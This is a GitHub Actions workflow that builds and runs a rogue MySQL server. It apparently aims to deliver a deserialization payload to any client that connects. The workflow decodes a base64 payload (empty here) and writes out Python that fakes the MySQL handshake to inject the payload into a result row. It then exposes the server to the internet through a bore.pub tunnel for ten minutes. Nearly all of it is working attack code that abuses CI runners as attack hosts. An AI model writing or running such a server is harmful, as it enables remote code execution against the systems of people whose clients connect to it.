name: MySQL Deser Verify v3

on:
  workflow_dispatch:

jobs:
  server:
    runs-on: ubuntu-latest
    steps:
      - name: Decode payload
        run: echo '' | base64 -d > payload.bin && wc -c payload.bin

      - name: Create rogue MySQL server
        run: |
          cat > rogue_mysql.py << 'PYEOF'
          import socket, struct, threading, sys

          def make_packet(payload, seq=0):
              header = struct.pack('<I', len(payload))[:3] + bytes([seq])
              return header + payload

          def greeting():
              p = b'\x0a'
              p += b'5.7.99-rogue\x00'
              p += struct.pack('<I', 1)
              p += b'ABCDEFGH'
              p += b'\x00'
              p += struct.pack('<H', 0xffff)
              p += b'\x21'
              p += struct.pack('<H', 0x0002)
              p += struct.pack('<H', 0x00ff)
              p += b'\x15'
              p += b'\x00' * 10
              p += b'IGHKLMNOPQRSTU\x00'
              p += b'mysql_native_password\x00'
              return make_packet(p)

          def ok_packet():
              return make_packet(b'\x00\x00\x02\x00\x00\x00', seq=2)

          def handle(conn, addr, payload):
              print(f'[+] Connection from {addr}', flush=True)
              try:
                  conn.send(greeting())
                  data = conn.recv(4096)
                  print(f'[*] Auth: {len(data)} bytes', flush=True)
                  conn.send(ok_packet())
                  data = conn.recv(4096)
                  print(f'[*] Query: {len(data)} bytes', flush=True)
                  col_count = make_packet(b'\x01', seq=1)
                  col_def = make_packet(b'\x03def\x00\x00\x00\x01a\x00\x0c\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00', seq=2)
                  eof = make_packet(b'\xfe\x00\x00\x02\x00', seq=3)
                  if len(payload) < 251:
                      row_data = bytes([len(payload)]) + payload
                  else:
                      row_data = b'\xfc' + struct.pack('<H', len(payload)) + payload
                  row = make_packet(row_data, seq=4)
                  eof2 = make_packet(b'\xfe\x00\x00\x02\x00', seq=5)
                  conn.send(col_count + col_def + eof + row + eof2)
                  print(f'[+] Payload sent ({len(payload)} bytes)', flush=True)
              except Exception as e:
                  print(f'[-] Error: {e}', flush=True)
              finally:
                  conn.close()

          def main():
              with open('payload.bin', 'rb') as f:
                  payload = f.read()
              print(f'[*] Payload: {len(payload)} bytes', flush=True)
              server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
              server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
              server.bind(('0.0.0.0', 3306))
              server.listen(5)
              print('[*] Listening on :3306', flush=True)
              while True:
                  conn, addr = server.accept()
                  threading.Thread(target=handle, args=(conn, addr, payload), daemon=True).start()

          if __name__ == '__main__':
              main()
          PYEOF

      - name: Install bore
        run: |
          curl -sL https://github.com/ekzhang/bore/releases/download/v0.5.2/bore-v0.5.2-x86_64-unknown-linux-musl.tar.gz | tar xz
          chmod +x bore
          ./bore --version

      - name: Start server and tunnel
        run: |
          python3 rogue_mysql.py &
          sleep 2
          echo "[*] Starting bore tunnel..."
          ./bore local 3306 --to bore.pub 2>&1 &
          BORE_PID=$!
          sleep 5
          echo "[*] Bore PID: $BORE_PID"
          echo "[*] Server running. Keeping alive for 10 minutes..."
          echo "[*] Check bore.pub for the assigned port"
          sleep 600

      - name: Cleanup
        if: always()
        run: |
          pkill -f rogue_mysql.py || true
          pkill -f bore || true
